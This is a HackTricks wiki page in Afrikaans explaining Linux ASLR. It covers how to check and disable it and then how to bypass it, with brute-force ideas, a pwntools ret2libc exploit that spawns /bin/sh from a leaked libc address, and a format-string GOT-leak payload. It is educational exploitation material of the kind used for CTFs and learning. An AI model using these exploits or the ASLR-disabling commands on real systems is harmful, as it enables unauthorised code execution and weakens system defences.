# ASLR

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

**Address Space Layout Randomization (ASLR)** is 'n sekuriteitstegniek wat in bedryfstelsels gebruik word om die **geheue-adresse te randomiseer** wat deur stelsel- en toepassingsprosesse gebruik word. Deur dit te doen, maak dit dit aansienlik moeiliker vir 'n aanvaller om die ligging van spesifieke prosesse en data te voorspel, soos die stapel, hoop, en biblioteke, en dit verminder sekere tipes aanvalle, veral buffer-oorvloeiings.

### **ASLR-status Kontroleer**

Om die ASLR-status op 'n Linux-stelsel te **kontroleer**, kan jy die waarde uit die `/proc/sys/kernel/randomize_va_space`-l√™er lees. Die waarde wat in hierdie l√™er gestoor word, bepaal die tipe ASLR wat toegepas word:

* **0**: Geen randomisering. Alles is staties.
* **1**: Konservatiewe randomisering. Gedeelde biblioteke, stapel, mmap(), VDSO-bladsy word gerandomiseer.
* **2**: Volledige randomisering. Bo en behalwe elemente wat deur konservatiewe randomisering gerandomiseer word, word geheue wat deur `brk()` bestuur word, gerandomiseer.

Jy kan die ASLR-status kontroleer met die volgende bevel:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktivering van ASLR**

Om ASLR te **deaktiveer**, stel jy die waarde van `/proc/sys/kernel/randomize_va_space` in op **0**. Die deaktivering van ASLR word gewoonlik nie aanbeveel buite toets- of foutopsporingscenarios nie. Hier is hoe jy dit kan deaktiveer:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Jy kan ook ASLR uitskakel vir 'n uitvoering met:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivering van ASLR**

Om ASLR te **aktiveer**, kan jy 'n waarde van **2** skryf na die `/proc/sys/kernel/randomize_va_space` l√™er. Dit vereis gewoonlik root-privileges. Volledige randomisering kan gedoen word met die volgende bevel:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Volharding oor Herlaai**

Veranderinge wat met die `echo` opdragte gemaak word, is tydelik en sal herstel word met herlaai. Om die verandering volhardend te maak, moet jy die `/etc/sysctl.conf` l√™er wysig en die volgende lyn byvoeg of wysig:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Na die wysiging van `/etc/sysctl.conf`, pas die veranderinge toe met:
```bash
sudo sysctl -p
```
Dit sal verseker dat jou ASLR-instellings behoue bly oor herlaai.

## **Oorskrydings**

### 32-bit brutaal krag

PaX verdeel die proses-adresruimte in **3 groepe**:

* **Kode en data** (ge√Ønisialiseer en onge√Ønisialiseer): `.text`, `.data`, en `.bss` ‚Äî> **16 bits** van entropie in die `delta_exec` veranderlike. Hierdie veranderlike word lukraak ge√Ønisialiseer met elke proses en by die aanvanklike adresse gevoeg.
* **Geheue** toegewys deur `mmap()` en **gedeelde biblioteke** ‚Äî> **16 bits**, genoem `delta_mmap`.
* **Die stok** ‚Äî> **24 bits**, verwys as `delta_stack`. Dit gebruik egter effektief **11 bits** (vanaf die 10de tot die 20ste byte insluitend), uitgelyn op **16 byte** ‚Äî> Dit lei tot **524,288 moontlike werklike stokadresse**.

Die vorige data is vir 32-bietestelsels en die verminderde finale entropie maak dit moontlik om ASLR te omseil deur die uitvoering herhaaldelik te probeer totdat die aanval suksesvol voltooi is.

#### Brutaal krag idees:

* As die aanval plaaslik is, kan jy die basisadres van libc brutaal krag. (nuttig vir 32-bietestelsels):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Indien jy 'n afgele√´ bediener aanval, kan jy probeer om die adres van die `libc`-funksie `usleep` te **brute-force**, met 10 as argument. As die bediener op enige punt 10 sekondes langer neem om te reageer, het jy die adres van hierdie funksie gevind.

{% hint style="success" %}
Op 64-biet-stelsels is die entropie baie ho√´r en is dit nie moontlik nie.
{% endhint %}

### Met 'n lek

* **Uitdaging is om 'n lek te h√™**

Indien jy 'n lek ontvang (maklike CTF-uitdagings), kan jy verskuiwings daaruit bereken (onder die aanname byvoorbeeld dat jy die presiese libc-weergawe ken wat in die stelsel wat jy aanval, gebruik word). Hierdie voorbeeld van 'n aanval is onttrek uit die [**voorbeeld van hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (kyk na daardie bladsy vir meer besonderhede):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Misbruik 'n buffer overflow dit sou moontlik wees om 'n **ret2plt** te misbruik om 'n adres van 'n funksie uit die libc te eksfiltreer. Kontroleer:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Net soos in ret2plt, as jy 'n arbitr√™re lees deur 'n formaatstrings kwesbaarheid het, is dit moontlik om die adres van 'n **libc funksie** uit die GOT te eksfiltreer. Die volgende [**voorbeeld is hier vandaan**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
### Ret2ret

Probeer ASLR te omzeilen deur adresse binne die stapel te misbruik:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
